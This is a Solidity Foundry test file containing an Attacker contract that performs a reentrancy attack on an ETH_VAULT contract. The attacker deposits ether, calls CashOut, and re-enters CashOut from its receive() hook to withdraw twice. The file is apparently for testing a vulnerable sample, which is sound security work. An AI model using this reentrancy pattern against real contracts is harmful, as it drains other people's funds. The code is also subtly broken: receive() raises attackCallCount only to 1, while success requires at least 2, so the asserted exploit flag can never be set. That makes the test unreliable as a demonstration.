
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT} from "../src/ETH_VAULT.sol";
import {Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {
    ETH_VAULT public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new ETH_VAULT(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 3);
        vm.deal(address(this), attackVal * 3);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackValue;

    constructor(address victimAddress) {
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackValue = val;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        uint256 initialAttackerBalance = address(this).balance;
        victim.CashOut(val);
        
        if (attackCallCount >= 2 && address(this).balance >= initialAttackerBalance + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            victim.CashOut(storedAttackValue);
        }
    }

    fallback() external payable {}
}
